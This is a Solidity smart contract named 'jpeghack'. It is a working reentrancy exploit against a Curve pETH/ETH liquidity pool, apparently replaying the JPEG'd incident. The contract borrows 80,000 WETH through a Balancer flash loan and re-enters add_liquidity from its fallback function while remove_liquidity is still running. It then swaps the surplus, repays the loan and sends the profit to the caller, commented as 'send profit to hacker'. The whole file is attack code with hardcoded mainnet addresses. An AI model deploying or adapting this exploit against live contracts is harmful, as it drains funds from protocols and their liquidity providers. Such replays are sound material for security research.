// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interface/IBal.sol";
import "./interface/IWETH.sol";
import "./interface/ICurvePool.sol";

import "hardhat/console.sol";

contract jpeghack is IFlashLoanRecipient {
    IVault bal = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 pETH = IERC20(0x836A808d4828586A69364065A1e064609F5078c7);
    ICurvePool pETH_ETH_f =
        ICurvePool(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);

    uint flashloanAmount = 80000000000000000000000;

    bool isWithdraw;

    function hack() external {
        // 1 flash loan from bal
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashloanAmount;

        bal.flashLoan(IFlashLoanRecipient(address(this)), tokens, amounts, "");
    }

    // 2 get flashloan weth from bal
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // 3 withdraw weth to eth
        weth.withdraw(flashloanAmount);

        isWithdraw = true;

        // 4 add_liquidity to pETH_ETH_f
        uint256[2] memory _amounts_add;
        _amounts_add[0] = flashloanAmount / 2;
        _amounts_add[1] = 0;
        pETH_ETH_f.add_liquidity{value: _amounts_add[0]}(_amounts_add, 0);

        // 5 get balance of pETH_ETH_f
        uint tokenBal1 = pETH_ETH_f.balanceOf(address(this));

        // 6 remove_liquidity from pETH_ETH_f
        uint[2] memory _amounts_remove;
        _amounts_remove[0] = 0;
        _amounts_remove[1] = 0;
        pETH_ETH_f.remove_liquidity(tokenBal1, _amounts_remove);
        ////////////       ======= fallback  ===========      ///////////////////
        ////////////       ======= fallback  ===========      ///////////////////
        ////////////       ======= fallback  ===========      ///////////////////
        isWithdraw = false;

        // 8 remove_liquidity again from pETH_ETH_f
        uint tokenBal2 = pETH_ETH_f.balanceOf(address(this));

        uint removeTokenBal2 = tokenBal2 / 8;
        pETH_ETH_f.remove_liquidity(removeTokenBal2, _amounts_remove);

        // 9 exchange pETH to eth from pETH_ETH_f
        pETH.approve(address(pETH_ETH_f), type(uint256).max);
        uint pETHBal = pETH.balanceOf(address(this));
        pETH_ETH_f.exchange(1, 0, pETHBal, 0);

        // 10 weth to eth
        weth.deposit{value: flashloanAmount}();

        // 11 payback flashloan to bal
        weth.transfer(address(bal), flashloanAmount);

        // 12 send profit to hacker
        payable(tx.origin).transfer(address(this).balance);
    }

    fallback() external payable {
        if (isWithdraw == true) {
            // 7 get eth from step6 and add_liquidity to pETH_ETH_f again
            uint256[2] memory _amounts_add;
            _amounts_add[0] = flashloanAmount / 2;
            _amounts_add[1] = 0;
            pETH_ETH_f.add_liquidity{value: _amounts_add[0]}(_amounts_add, 0);
        }
    }
}
